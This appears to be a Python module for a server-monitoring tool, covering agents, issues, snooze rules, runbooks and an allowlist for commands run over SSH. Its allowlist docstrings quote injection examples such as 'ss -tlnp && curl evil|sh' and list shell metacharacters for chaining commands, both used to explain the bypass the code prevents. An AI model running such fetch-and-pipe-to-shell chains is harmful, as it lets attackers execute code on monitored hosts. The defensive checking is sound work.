import threading
import logging
import sqlite3
import json
import os
import time
import secrets
from datetime import datetime, timezone, timedelta
from . import config
from . import utils
from .state_base import logger, db_lock, _get_conn, DB_FILE, shutdown_event, ollama_queue, frontend_queue

def get_agent_issues(hostname: str) -> list:
    """Returns active issues for a specific agent."""
    issues = []
    try:
        conn = _get_conn()
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            "SELECT key, status, channel_type, plugin_name, last_line, last_seen, occurrence_count "
            "FROM problems WHERE key LIKE ? AND status IN ('active','validating') ORDER BY last_seen DESC",
            (f'AGENT|{hostname}|%',)
        ).fetchall()
        conn.close()
        issues = [dict(r) for r in rows]
    except Exception as e:
        logger.error(f"DB Error get_agent_issues: {e}")
    return issues

def get_snooze_rules() -> list:
    try:
        conn = _get_conn()
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT * FROM snooze_rules ORDER BY start_hour ASC").fetchall()
        conn.close()
        return [dict(r) for r in rows]
    except Exception as e:
        logger.error(f"DB Error get_snooze_rules: {e}")
        return []

def add_snooze_rule(name: str, channels: str, start_hour: int, end_hour: int, days: str, hosts: str = None) -> bool:
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute(
                "INSERT INTO snooze_rules (name, channels, start_hour, end_hour, days, hosts, enabled, created_at) VALUES (?,?,?,?,?,?,1,datetime('now'))",
                (name, channels, start_hour, end_hour, days, hosts or None)
            )
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"DB Error add_snooze_rule: {e}")
            return False

def delete_snooze_rule(rule_id: int) -> bool:
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("DELETE FROM snooze_rules WHERE id=?", (rule_id,))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"DB Error delete_snooze_rule: {e}")
            return False

def toggle_snooze_rule(rule_id: int, enabled: bool) -> bool:
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("UPDATE snooze_rules SET enabled=? WHERE id=?", (1 if enabled else 0, rule_id))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"DB Error toggle_snooze_rule: {e}")
            return False

def apply_snooze_rules():
    """Called every minute; snoozes active issues that fall within an enabled maintenance window."""
    from datetime import datetime as _dt
    now = _dt.now()
    cur_hour = now.hour
    cur_dow  = now.weekday()  # 0=Monday

    rules = get_snooze_rules()
    for rule in rules:
        if not rule.get('enabled'):
            continue
        start_h = rule['start_hour']
        end_h   = rule['end_hour']
        days_str = rule.get('days', '*')

        # Check day-of-week match
        if days_str != '*':
            allowed = {int(d) for d in days_str.split(',') if d.strip().isdigit()}
            if cur_dow not in allowed:
                continue

        # Check hour range (handles wrap-around midnight: start > end)
        if start_h <= end_h:
            in_window = start_h <= cur_hour < end_h
        else:
            in_window = cur_hour >= start_h or cur_hour < end_h

        if not in_window:
            continue

        # Compute snooze_until = today end_hour:00 (or tomorrow if end < start)
        from datetime import timedelta as _td
        snooze_target = now.replace(minute=0, second=0, microsecond=0)
        if start_h > end_h and cur_hour >= start_h:
            snooze_target = (snooze_target + _td(days=1)).replace(hour=end_h)
        else:
            snooze_target = snooze_target.replace(hour=end_h)
        snooze_str = snooze_target.isoformat(sep=' ', timespec='seconds')

        # Build channel + host filter
        channels_str = rule.get('channels', '*')
        hosts_str = rule.get('hosts') or '*'
        with db_lock:
            try:
                conn = _get_conn()
                where_conds = ["status IN ('active','validating')", "(snoozed_until IS NULL OR snoozed_until < ?)"]
                where_params = [snooze_str]
                if channels_str != '*':
                    ch_list = [c.strip().lower() for c in channels_str.split(',')]
                    where_conds.append(f"lower(channel_type) IN ({','.join('?'*len(ch_list))})")
                    where_params.extend(ch_list)
                if hosts_str != '*':
                    h_list = [h.strip().lower() for h in hosts_str.split(',')]
                    where_conds.append(f"lower(host) IN ({','.join('?'*len(h_list))})")
                    where_params.extend(h_list)
                conn.execute(
                    f"UPDATE problems SET snoozed_until=? WHERE {' AND '.join(where_conds)}",
                    [snooze_str] + where_params
                )
                conn.commit()
                conn.close()
            except Exception as e:
                logger.error(f"apply_snooze_rules error: {e}")

def get_agent_health() -> list:
    """Returns all agents enriched with alert counts from the problems table."""
    try:
        conn = _get_conn()
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("SELECT hostname, status, last_seen, registered_at, ignore_offline, notes, category, agent_version, agent_group, maintenance_until, last_data_lag_ms FROM agents ORDER BY status ASC, hostname ASC")
        agents = [dict(r) for r in c.fetchall()]
        for ag in agents:
            h = ag['hostname']
            c.execute("""
                SELECT
                    COUNT(*) as total,
                    SUM(CASE WHEN last_seen >= datetime('now','-1 day') THEN 1 ELSE 0 END) as today,
                    SUM(CASE WHEN last_seen >= datetime('now','-7 days') THEN 1 ELSE 0 END) as week,
                    MAX(last_seen) as last_alert
                FROM problems
                WHERE key LIKE ?
            """, (f'AGENT|{h}|%',))
            r = c.fetchone()
            ag['alerts_24h']   = r['today'] or 0
            ag['alerts_7d']    = r['week']  or 0
            ag['alerts_total'] = r['total'] or 0
            ag['last_alert']   = r['last_alert']
            _score = 100
            if ag.get('status') == 'ONLINE':
                lag_ms = ag.get('last_data_lag_ms') or 0
                lag_penalty = min(int(lag_ms / 6000), 40)
                _score -= lag_penalty
            elif ag.get('maintenance_until'):
                _score -= 20
            else:
                _score -= 40
            alert_penalty = min(ag['alerts_24h'] * 3, 30)
            _score -= alert_penalty
            if not ag.get('ignore_offline') and ag.get('status') != 'ONLINE':
                _score -= 10
            ag['health_score'] = max(0, _score)
        conn.close()
        return agents
    except Exception as e:
        logger.error(f"DB Error get_agent_health: {e}")
        return []

def get_alert_timeline(days: int = 7) -> dict:
    """Returns hourly heatmap and daily totals for the last N days."""
    try:
        conn = _get_conn()
        c = conn.cursor()
        c.execute("""
            SELECT strftime('%Y-%m-%d', last_seen) as day,
                   CAST(strftime('%H', last_seen) AS INTEGER) as hour,
                   COUNT(*) as cnt
            FROM problems
            WHERE last_seen >= datetime('now', ?)
            GROUP BY day, hour
            ORDER BY day, hour
        """, (f'-{days} days',))
        heatmap = [{"day": r[0], "hour": r[1], "count": r[2]} for r in c.fetchall()]
        c.execute("""
            SELECT strftime('%Y-%m-%d', last_seen) as day, COUNT(*) as cnt,
                   channel_type
            FROM problems
            WHERE last_seen >= datetime('now', ?)
            GROUP BY day, channel_type
            ORDER BY day
        """, (f'-{days} days',))
        by_channel = [{"day": r[0], "count": r[1], "channel": r[2] or 'OTHER'} for r in c.fetchall()]
        conn.close()
        return {"heatmap": heatmap, "by_channel": by_channel, "days": days}
    except Exception as e:
        logger.error(f"DB Error get_alert_timeline: {e}")
        return {"heatmap": [], "by_channel": [], "days": days}

def get_plugin_stats() -> list:
    """Returns per-plugin alert counts from active problems + issue_history (30 days)."""
    try:
        conn = _get_conn()
        c = conn.cursor()
        # Active issues — uses indexed plugin_name column
        c.execute("""
            SELECT
                plugin_name,
                COUNT(*) as active,
                SUM(CASE WHEN last_seen >= date('now') THEN 1 ELSE 0 END) as today,
                MAX(last_seen) as last_seen
            FROM problems
            WHERE plugin_name IS NOT NULL AND plugin_name != ''
              AND lower(plugin_name) != 'unknown'
            GROUP BY plugin_name
        """)
        active_rows = {r[0]: {"active": r[1], "today": r[2] or 0, "last_seen": r[3]} for r in c.fetchall()}

        # Historical (last 30 days)
        c.execute("""
            SELECT plugin_name, COUNT(*) as resolved_30d, MAX(resolved_at) as last_resolved
            FROM issue_history
            WHERE plugin_name IS NOT NULL AND plugin_name != ''
              AND lower(plugin_name) != 'unknown'
              AND resolved_at > datetime('now', '-30 days')
            GROUP BY plugin_name
        """)
        hist_rows = {r[0]: {"resolved_30d": r[1], "last_resolved": r[2]} for r in c.fetchall()}
        conn.close()

        all_plugins = set(active_rows) | set(hist_rows)
        result = []
        for p in all_plugins:
            a = active_rows.get(p, {})
            h = hist_rows.get(p, {})
            result.append({
                "plugin": p,
                "total": (a.get("active", 0) + h.get("resolved_30d", 0)),
                "today": a.get("today", 0),
                "active": a.get("active", 0),
                "resolved_30d": h.get("resolved_30d", 0),
                "last_seen": a.get("last_seen") or h.get("last_resolved"),
            })
        return sorted(result, key=lambda x: -x["total"])
    except Exception as e:
        logger.error(f"DB Error get_plugin_stats: {e}")
        return []

def get_issue_user_order(username: str, channel: str) -> list:
    try:
        conn = _get_conn()
        rows = conn.execute(
            "SELECT issue_key FROM issue_user_order WHERE username=? AND channel=? ORDER BY position ASC",
            (username, channel)
        ).fetchall()
        conn.close()
        return [r[0] for r in rows]
    except Exception:
        return []

def set_issue_user_order(username: str, channel: str, keys: list):
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("DELETE FROM issue_user_order WHERE username=? AND channel=?", (username, channel))
            conn.executemany(
                "INSERT INTO issue_user_order (username, channel, issue_key, position) VALUES (?, ?, ?, ?)",
                [(username, channel, key, pos) for pos, key in enumerate(keys)]
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"set_issue_user_order error: {e}")

def enqueue_message(text, channel="general", msg_type="problem", context=None):
    ollama_queue.put({"text": text, "channel": channel, "type": msg_type, "context": context})

def delete_all_pending_actions():
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("DELETE FROM actions WHERE status='pending'")
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"DB Error delete_all_pending_actions: {e}")
            return False

def delete_action(action_id):
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("DELETE FROM actions WHERE id=?", (action_id,))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"DB Error delete_action: {e}")
            return False

def approve_action_mode(action_id):
    """Clear dry_run mode so run_ssh_command_real executes for real."""
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("UPDATE actions SET mode='approved' WHERE id=?", (action_id,))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"DB Error approve_action_mode: {e}")

def update_action_command(action_id, new_command, updated_by=None):
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("UPDATE actions SET command=? WHERE id=? AND status='pending'",
                         (new_command, action_id))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"DB Error update_action_command: {e}")
            return False
    log_action_event(action_id, "command_updated", actor=updated_by,
                     details={"new_command": new_command})
    return True

def add_allowed_command(pattern, description="", auto_execute=False, risk_max=30, note=""):
    with db_lock:
        try:
            conn = _get_conn()
            now = datetime.now(timezone.utc).isoformat()
            c = conn.cursor()
            c.execute(
                "INSERT INTO allowed_commands (pattern, description, auto_execute, risk_max, note, created_at) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (pattern, description, 1 if auto_execute else 0, int(risk_max), note, now)
            )
            rid = c.lastrowid
            conn.commit()
            conn.close()
            return rid
        except Exception as e:
            logger.error(f"DB Error add_allowed_command: {e}")
            return None

def list_allowed_commands():
    try:
        conn = _get_conn()
        conn.row_factory = sqlite3.Row
        c = conn.cursor()
        c.execute("SELECT * FROM allowed_commands ORDER BY id ASC")
        rows = c.fetchall()
        conn.close()
        return [dict(r) for r in rows]
    except Exception as e:
        logger.error(f"DB Error list_allowed_commands: {e}")
        return []

def delete_allowed_command(cmd_id):
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("DELETE FROM allowed_commands WHERE id=?", (cmd_id,))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"DB Error delete_allowed_command: {e}")
            return False

def update_allowed_command(cmd_id, **kwargs):
    allowed_fields = {'pattern', 'description', 'auto_execute', 'risk_max', 'note'}
    updates = {k: v for k, v in kwargs.items() if k in allowed_fields}
    if not updates:
        return False
    if 'auto_execute' in updates:
        updates['auto_execute'] = 1 if updates['auto_execute'] else 0
    if 'risk_max' in updates:
        updates['risk_max'] = int(updates['risk_max'])
    with db_lock:
        try:
            conn = _get_conn()
            set_clause = ', '.join(f"{k}=?" for k in updates)
            values = list(updates.values()) + [cmd_id]
            conn.execute(f"UPDATE allowed_commands SET {set_clause} WHERE id=?", values)
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"DB Error update_allowed_command: {e}")
            return False

def check_command_allowed(command):
    """Returns first matching allowed_command rule or None. Uses fnmatch glob patterns.

    BEZPEČNOST: porovnává se CELÝ příkaz, ne podřetězec. Dřívější fallback
    `rule['pattern'] in command` znamenal, že allowlist šel obejít připojením
    čehokoli přes && / | ('ss -tlnp && curl evil|sh' obsahuje 'ss -tlnp'),
    čímž byl celý allowlist + safety klasifikátor neúčinný.
    Legitimní compound pravidla (např. 'journalctl --rotate && journalctl
    --vacuum-time=7d') fungují dál — matchují se jako celek.
    """
    import fnmatch
    cmd = (command or '').strip()
    if not cmd:
        return None
    for rule in list_allowed_commands():
        try:
            pattern = (rule.get('pattern') or '').strip()
            if not pattern:
                continue
            if cmd == pattern:
                return rule
            if fnmatch.fnmatch(cmd, pattern) and not _adds_shell_meta(cmd, pattern):
                return rule
        except Exception:
            pass
    return None


# Shell metaznaky, kterými lze zřetězit další příkaz
_SHELL_META = ('&', '|', ';', '`', '$(', '\n', '>', '<')


def _adds_shell_meta(cmd: str, pattern: str) -> bool:
    """True pokud příkaz obsahuje shell metaznak, který v patternu není.

    Glob '*' v pravidle ('systemctl restart *') má zastoupit jméno unitu, ne
    libovolný shell — bez této kontroly by fnmatch propustil
    'systemctl restart x && curl evil|sh'. Pravidla, která metaznaky legitimně
    obsahují (např. 'du -sh /var/* | sort -rh | head -20'), fungují dál.
    """
    return any(m in cmd and m not in pattern for m in _SHELL_META)

def register_new_agent(hostname, token, category=None, web_ui_url=None):
    now_str = datetime.now(timezone.utc).isoformat()
    if category is None:
        if hostname.startswith('sentinel-alert'):
            category = 'alert'
        elif hostname.startswith('sentinel-hw-'):
            category = 'hw'
    with db_lock:
        conn = None
        try:
            conn = _get_conn()
            conn.execute("""
                INSERT INTO agents (hostname, token, registered_at, last_seen, status, category, notes)
                VALUES (?, ?, ?, ?, 'OFFLINE', ?, ?)
                ON CONFLICT(hostname) DO UPDATE SET token=excluded.token,
                    registered_at=COALESCE(registered_at, excluded.registered_at),
                    category=COALESCE(excluded.category, category),
                    notes=COALESCE(excluded.notes, notes)
            """, (hostname, token, now_str, now_str, category, web_ui_url))
            return True
        except Exception as e:
            logger.error(f"DB Error register_new_agent: {e}")
            return False
        finally:
            if conn is not None: conn.close()

def update_agent_ip(hostname: str, ip: str):
    if not ip or ip in ('127.0.0.1', '::1', 'localhost'):
        return
    with db_lock:
        conn = None
        try:
            conn = _get_conn()
            row = conn.execute("SELECT ip_addresses FROM agents WHERE hostname=?", (hostname,)).fetchone()
            if row is None:
                return
            ips = json.loads(row[0] or '[]')
            if ip not in ips:
                ips.append(ip)
                conn.execute("UPDATE agents SET ip_addresses=? WHERE hostname=?", (json.dumps(ips), hostname))
                conn.commit()
        except Exception as e:
            logger.error(f"update_agent_ip: {e}")
        finally:
            if conn is not None: conn.close()

def update_agent_lag(hostname: str, lag_ms: int):
    with db_lock:
        conn = None
        try:
            conn = _get_conn()
            conn.execute("UPDATE agents SET last_data_lag_ms=? WHERE hostname=?", (int(lag_ms), hostname))
            conn.commit()
        except Exception as e:
            logger.error(f"update_agent_lag: {e}")
        finally:
            if conn is not None: conn.close()

def get_all_agents():
    try:
        with _get_conn() as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute("SELECT * FROM agents ORDER BY hostname ASC").fetchall()
        return [dict(r) for r in rows]
    except Exception as e:
        logger.error(f"DB Error get_all_agents: {e}")
        return []

def set_agent_ignore_offline(hostname, ignore: bool):
    with db_lock:
        conn = None
        try:
            conn = _get_conn()
            conn.execute("UPDATE agents SET ignore_offline = ? WHERE hostname = ?", (1 if ignore else 0, hostname))
            return True
        except Exception as e:
            logger.error(f"DB Error set_agent_ignore_offline: {e}")
            return False
        finally:
            if conn is not None: conn.close()

def verify_agent_token(hostname, token):
    with db_lock:
        conn = None
        try:
            conn = _get_conn()
            c = conn.execute("SELECT token FROM agents WHERE hostname = ?", (hostname,))
            row = c.fetchone()
            if not (row and row[0] and token):
                return False
            return secrets.compare_digest(str(row[0]), str(token))
        except Exception as e:
            logger.error(f"DB Error verify_agent_token: {e}")
            return False
        finally:
            if conn is not None: conn.close()

def update_agent_heartbeat(hostname, status_str="ONLINE"):
    now_str = datetime.now(timezone.utc).isoformat()
    with db_lock:
        conn = None
        try:
            conn = _get_conn()
            conn.execute("UPDATE agents SET last_seen = ?, status = ? WHERE hostname = ?", (now_str, status_str, hostname))
            return True
        except Exception as e:
            logger.error(f"DB Error update_agent_heartbeat: {e}")
            return False
        finally:
            if conn is not None: conn.close()

def delete_agent(hostname):
    with db_lock:
        conn = None
        try:
            conn = _get_conn()
            conn.execute("DELETE FROM agents WHERE hostname = ?", (hostname,))
            return True
        except Exception as e:
            logger.error(f"DB Error delete_agent: {e}")
            return False
        finally:
            if conn is not None: conn.close()

# ==============================================================================
# AGENT HEARTBEAT WATCHDOG
# ==============================================================================

def agent_watchdog_loop():
    import time
    from datetime import datetime, timezone, timedelta
    
    logger.info("Agent Watchdog started.")
    
    while not shutdown_event.is_set():
        time.sleep(60) 
        
        try:
            now = datetime.now(timezone.utc)
            with db_lock:
                conn = _get_conn()
                try:
                    c = conn.execute("SELECT hostname, last_seen, heartbeat_timeout FROM agents WHERE status = 'ONLINE'")
                    active_agents = c.fetchall()
                    _global_timeout = int(getattr(config, 'AGENT_HEARTBEAT_TIMEOUT', 180))

                    for row in active_agents:
                        hostname, last_seen_str, hb_timeout = row
                        timeout_secs = int(hb_timeout) if hb_timeout else _global_timeout
                        try:
                            clean_str = last_seen_str.replace('Z', '+00:00')
                            last_seen_dt = datetime.fromisoformat(clean_str)
                            if last_seen_dt.tzinfo is None:
                                last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)

                            if (now - last_seen_dt).total_seconds() > timeout_secs:
                                conn.execute("UPDATE agents SET status = 'OFFLINE' WHERE hostname = ?", (hostname,))
                                logger.info(f"Watchdog: Agent '{hostname}' is now OFFLINE (timeout={timeout_secs}s).")
                        except Exception as parse_err:
                            logger.error(f"Watchdog: Error parsing date for agent '{hostname}': {parse_err}")

                    # Auto-expire fail2ban bans older than 1 hour
                    try:
                        c2 = conn.execute(
                            "SELECT key, last_seen FROM problems "
                            "WHERE key LIKE '%|fail2ban' OR key LIKE '%|fail2ban_honeypot'"
                        )
                        for key, last_seen_str in c2.fetchall():
                            try:
                                clean = (last_seen_str or '').replace('Z', '+00:00')
                                ls_dt = datetime.fromisoformat(clean)
                                if ls_dt.tzinfo is None:
                                    ls_dt = ls_dt.replace(tzinfo=timezone.utc)
                                if (now - ls_dt).total_seconds() > 3600:
                                    conn.execute("DELETE FROM problems WHERE key=?", (key,))
                                    conn.execute(
                                        "UPDATE actions SET status='resolved_auto' WHERE problem_key=? AND status='pending'",
                                        (key,)
                                    )
                                    logger.info(f"Watchdog: Auto-expired fail2ban problem '{key}' (>1h)")
                            except Exception as fe:
                                logger.error(f"Watchdog: fail2ban expire error for '{key}': {fe}")
                        conn.commit()
                    except Exception as fe2:
                        logger.error(f"Watchdog: fail2ban cleanup error: {fe2}")
                finally:
                    conn.close()

        except Exception as e:
            logger.error(f"Agent watchdog main loop error: {e}")

        # Daily pruning — issue_history (>90 dní) a root_audit (>30 dní, neaktivní)
        try:
            if not hasattr(agent_watchdog_loop, '_prune_counter'):
                agent_watchdog_loop._prune_counter = 0
            agent_watchdog_loop._prune_counter += 1
            if agent_watchdog_loop._prune_counter >= 1440:  # každý den (1440 minut)
                agent_watchdog_loop._prune_counter = 0
                # dlouhá zápisová transakce MUSÍ držet db_lock, jinak běží
                # souběžně s agent ingestem → SQLITE_BUSY
                _hist_days = int(getattr(config, 'ISSUE_HISTORY_RETENTION_DAYS', 90))
                with db_lock:
                    conn_p = _get_conn()
                    try:
                        conn_p.execute(
                            "DELETE FROM issue_history WHERE resolved_at < datetime('now', ?)",
                            (f'-{_hist_days} days',))
                        conn_p.execute("DELETE FROM root_audit WHERE is_active=0 AND connected_at < datetime('now', '-30 days')")
                        conn_p.execute("DELETE FROM action_audit WHERE at < datetime('now', '-90 days')")
                        conn_p.commit()
                        logger.info(f"Daily pruning: issue_history (>{_hist_days}d), root_audit, action_audit cleaned.")
                    finally:
                        conn_p.close()
        except Exception as pe:
            logger.error(f"Watchdog daily pruning error: {pe}")

        # Weekly VACUUM — spustí se jednou za 7 dní (604800 sekund / 60 iterací)
        try:
            if not hasattr(agent_watchdog_loop, '_vacuum_counter'):
                agent_watchdog_loop._vacuum_counter = 0
            agent_watchdog_loop._vacuum_counter += 1
            if agent_watchdog_loop._vacuum_counter >= 10080:  # 7 dní × 1440 minut
                agent_watchdog_loop._vacuum_counter = 0
                # VACUUM potřebuje exkluzivní zámek celé DB — bez db_lock
                # kolidoval s běžícími zápisy
                with db_lock:
                    conn_v = _get_conn()
                    try:
                        conn_v.execute("VACUUM")
                        logger.info("DB VACUUM dokončen.")
                    finally:
                        conn_v.close()
        except Exception as ve:
            logger.error(f"Watchdog VACUUM error: {ve}")

def agent_heartbeat_maintenance_loop():
    """Automatically maintains heartbeat for registered sentinel-alert agents.
    This ensures agents stay ONLINE without needing to send their own heartbeats."""
    import time
    from datetime import datetime, timezone

    logger.info("Agent Heartbeat Maintenance started.")

    while not shutdown_event.is_set():
        time.sleep(50)  # Every 50 seconds (under 180s threshold)

        try:
            now = datetime.now(timezone.utc).isoformat()
            with db_lock:
                conn = _get_conn()
                try:
                    # Update last_seen for all sentinel-alert agents to keep them ONLINE
                    c = conn.execute(
                        "SELECT hostname FROM agents WHERE hostname LIKE 'sentinel-alert%' OR hostname = 'sentinel-alert'"
                    )
                    agents = c.fetchall()

                    for (hostname,) in agents:
                        conn.execute(
                            "UPDATE agents SET last_seen = ?, status = 'ONLINE' WHERE hostname = ?",
                            (now, hostname)
                        )
                        logger.debug(f"Heartbeat maintenance: Updated '{hostname}' last_seen")

                    conn.commit()
                finally:
                    conn.close()
        except Exception as e:
            logger.error(f"Agent heartbeat maintenance error: {e}")

agent_watchdog_thread = threading.Thread(target=agent_watchdog_loop, daemon=True, name="Agent-Watchdog")
agent_watchdog_thread.start()

agent_heartbeat_thread = threading.Thread(target=agent_heartbeat_maintenance_loop, daemon=True, name="Agent-Heartbeat-Maintenance")
agent_heartbeat_thread.start()

def log_root_audit(server, ip, is_active):
    with db_lock:
        conn = _get_conn()
        try:
            now = datetime.now(timezone.utc).isoformat()
            if is_active:
                conn.execute("INSERT INTO root_audit (server, ip, connected_at, is_active) VALUES (?, ?, ?, 1)", (server, ip, now))
            else:
                conn.execute("UPDATE root_audit SET disconnected_at = ?, is_active = 0 WHERE server = ? AND ip = ? AND is_active = 1", (now, server, ip))
        finally:
            conn.close()

def reconcile_agent_issues(hostname: str, reported_keys: set) -> list:
    """After each agent ingest: resolve active issues not in reported_keys.

    missing_count is incremented each time an issue is absent from the report.
    When it reaches AUTO_RESOLVE_MISSING_COUNT the issue is auto-resolved.
    Returns list of auto-resolved keys.
    """
    from .state_issues import _archive_problem
    threshold = getattr(config, 'AUTO_RESOLVE_MISSING_COUNT', 3)
    resolved = []
    try:
        with db_lock:
            conn = _get_conn()
            try:
                rows = conn.execute(
                    "SELECT key, missing_count FROM problems "
                    "WHERE status = 'active' AND key LIKE ?",
                    (f"AGENT|{hostname}|%",)
                ).fetchall()
                now = datetime.now(timezone.utc).isoformat()
                for row_key, m_count in rows:
                    if row_key in reported_keys:
                        if (m_count or 0) > 0:
                            conn.execute("UPDATE problems SET missing_count=0 WHERE key=?", (row_key,))
                    else:
                        new_count = (m_count or 0) + 1
                        if new_count >= threshold:
                            _archive_problem(conn, row_key, reason='agent_report_ok')
                            conn.execute(
                                "UPDATE actions SET status='resolved_auto' WHERE problem_key=? AND status='pending'",
                                (row_key,)
                            )
                            conn.execute("DELETE FROM problems WHERE key=?", (row_key,))
                            resolved.append(row_key)
                            logger.info(f"Auto-resolved (missing {new_count}x): {row_key}")
                        else:
                            conn.execute(
                                "UPDATE problems SET missing_count=? WHERE key=?",
                                (new_count, row_key)
                            )
                conn.commit()
            finally:
                conn.close()
    except Exception as e:
        logger.error(f"reconcile_agent_issues error: {e}")
    return resolved


def auto_resolve_old_problems(days: int = 7):
    """Housekeeping: delete old resolved problems and time-based resolve stale active issues.

    Per-channel expiry from config.ISSUE_EXPIRY_DAYS: {channel: days}.
    Falls back to global AUTO_RESOLVE_HOURS for ONLINE-agent issues.
    """
    from .state_issues import _archive_problem
    with db_lock:
        try:
            conn = _get_conn()
            c = conn.cursor()
            # Purge old resolved/deleted problems
            c.execute(
                "DELETE FROM problems WHERE last_seen < datetime('now', ?) AND status NOT IN ('active', 'validating')",
                (f'-{days} days',)
            )
            deleted = c.rowcount
            conn.commit()

            # Per-channel expiry (025): active issues older than channel threshold → auto-resolve
            expiry_map = getattr(config, 'ISSUE_EXPIRY_DAYS', {})
            expiry_resolved = 0
            for channel, exp_days in expiry_map.items():
                try:
                    exp_secs = int(float(exp_days) * 86400)  # SQLite: celá čísla sekund
                    stale_ch = conn.execute(
                        "SELECT key FROM problems WHERE status='active' AND LOWER(channel_type)=? "
                        "AND julianday(replace(last_seen,'T',' ')) < julianday('now', ?)",
                        (channel.lower(), f'-{exp_secs} seconds')
                    ).fetchall()
                    for (key,) in stale_ch:
                        _archive_problem(conn, key, reason='channel_expiry')
                        conn.execute(
                            "UPDATE actions SET status='resolved_auto' WHERE problem_key=? AND status='pending'",
                            (key,)
                        )
                        conn.execute("DELETE FROM problems WHERE key=?", (key,))
                        expiry_resolved += 1
                except Exception as e:
                    logger.error(f"auto_resolve expiry channel={channel}: {e}")
            if expiry_resolved:
                logger.info(f"auto_resolve: issue_expiry removed {expiry_resolved} issues (per-channel)")
            conn.commit()

            # Time-based auto-resolve: active issues from ONLINE agents not updated in N hours
            hours = getattr(config, 'AUTO_RESOLVE_HOURS', 4)
            stale = conn.execute("""
                SELECT p.key FROM problems p
                WHERE p.status = 'active'
                  AND p.last_seen < datetime('now', ?)
                  AND EXISTS (
                      SELECT 1 FROM agents a
                      WHERE a.status = 'ONLINE'
                        AND json_extract(p.details, '$.host') = a.hostname
                  )
            """, (f'-{hours} hours',)).fetchall()
            for (key,) in stale:
                _archive_problem(conn, key, reason='agent_silent')
                conn.execute(
                    "UPDATE actions SET status='resolved_auto' WHERE problem_key=? AND status='pending'",
                    (key,)
                )
                conn.execute("DELETE FROM problems WHERE key=?", (key,))
            if stale:
                logger.info(f"auto_resolve: time-based removed {len(stale)} stale issues (>{hours}h no update)")

            conn.commit()
            conn.close()
            if deleted:
                logger.info(f"auto_resolve: purged {deleted} old resolved problems")
        except Exception as e:
            logger.error(f"auto_resolve_old_problems error: {e}")

def get_runbook(issue_type: str) -> dict | None:
    try:
        conn = _get_conn()
        row = conn.execute(
            "SELECT id, issue_type, plugin, channel, content, created_by, updated_at FROM runbooks WHERE issue_type=?",
            (issue_type,)
        ).fetchone()
        conn.close()
        if row:
            return dict(zip(['id','issue_type','plugin','channel','content','created_by','updated_at'], row))
    except Exception as e:
        logger.error(f"get_runbook: {e}")
    return None

def save_runbook(issue_type: str, content: str, plugin: str = '', channel: str = '', created_by: str = 'AI') -> bool:
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute(
                "INSERT INTO runbooks (issue_type, plugin, channel, content, created_by, updated_at) VALUES (?,?,?,?,?,datetime('now')) "
                "ON CONFLICT(issue_type) DO UPDATE SET content=excluded.content, updated_at=excluded.updated_at, created_by=excluded.created_by",
                (issue_type, plugin, channel, content, created_by)
            )
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"save_runbook: {e}")
            return False

def list_runbooks() -> list:
    with db_lock:
        try:
            conn = _get_conn()
            conn.row_factory = sqlite3.Row
            rows = conn.execute("SELECT id, issue_type, plugin, channel, created_by, updated_at FROM runbooks ORDER BY updated_at DESC").fetchall()
            conn.close()
            return [dict(r) for r in rows]
        except Exception as e:
            logger.error(f"list_runbooks: {e}")
            return []

def delete_runbook(runbook_id: int) -> bool:
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("DELETE FROM runbooks WHERE id=?", (runbook_id,))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"delete_runbook: {e}")
            return False

def get_agent_labels(hostname: str) -> dict:
    """Return labels dict for an agent. Always returns a dict."""
    try:
        conn = _get_conn()
        row = conn.execute("SELECT labels FROM agents WHERE hostname=?", (hostname,)).fetchone()
        conn.close()
        if row and row[0]:
            return json.loads(row[0])
    except Exception:
        pass
    return {}


def set_agent_labels(hostname: str, labels: dict) -> bool:
    """Set labels dict for an agent. Merges with existing labels."""
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("UPDATE agents SET labels=? WHERE hostname=?",
                         (json.dumps(labels), hostname))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            logger.error(f"set_agent_labels error: {e}")
            return False


def get_all_user_roles() -> list:
    try:
        conn = _get_conn()
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT username, role, updated_at FROM user_roles ORDER BY username").fetchall()
        conn.close()
        return [{"username": r['username'], "role": r['role'], "updated_at": r['updated_at'], "source": "db"} for r in rows]
    except Exception as e:
        logger.error(f"get_all_user_roles: {e}")
        return []

def set_user_role(username: str, role: str):
    with db_lock:
        try:
            conn = _get_conn()
            now = datetime.now(timezone.utc).isoformat()
            conn.execute(
                "INSERT INTO user_roles (username, role, updated_at) VALUES (?, ?, ?) "
                "ON CONFLICT(username) DO UPDATE SET role=excluded.role, updated_at=excluded.updated_at",
                (username, role, now)
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"set_user_role: {e}")

def delete_user_role(username: str):
    with db_lock:
        try:
            conn = _get_conn()
            conn.execute("DELETE FROM user_roles WHERE username = ?", (username,))
            conn.commit()
